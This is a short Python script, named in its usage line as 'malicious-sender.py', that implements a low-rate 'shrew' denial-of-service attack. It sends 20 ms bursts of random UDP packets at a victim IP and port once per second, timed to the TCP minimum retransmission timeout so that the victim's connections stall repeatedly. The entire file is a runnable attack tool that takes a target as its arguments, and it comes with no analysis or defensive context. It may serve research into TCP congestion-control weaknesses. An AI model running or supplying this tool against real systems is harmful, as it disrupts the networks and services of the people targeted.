import sys
import socket
import os
import math
import time

DURATION = 20 # The duration of the square wave pulse in milliseconds  
PERIOD = 1000 # The period between square wave pulses in milliseconds (opimally should be minRTO)

def attack(address, port): 
    # Send DoS square wave for 'duration' to cause RTO to fire
    sendtraffic(address, port, DURATION)

    # Continually re-send DoS traffic once every 'period' milliseconds to cause RTO to fail again
    starttime = math.floor(time.time() * 1000)

    while True:
        if math.floor(time.time() * 1000) > starttime + PERIOD:
            starttime = math.floor(time.time() * 1000)
            sendtraffic(address, port, DURATION)

def sendtraffic(address, port, duration):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = os.urandom(1024)
    starttime = math.floor(time.time() * 1000) # time() returns near-microsecond accuracy on Linux

    sock.sendto(payload, (address, port))

    while math.floor(time.time() * 1000) < starttime + duration:
       sock.sendto(payload, (address, port))


def main():
    if len(sys.argv) != 3:
        sys.exit("Usage: python malicious-sender.py (Victim IP) (Victim Port)")
    address = sys.argv[1]
    port = int(sys.argv[2])
    attack(address, port)

if __name__ == "__main__":
    main()
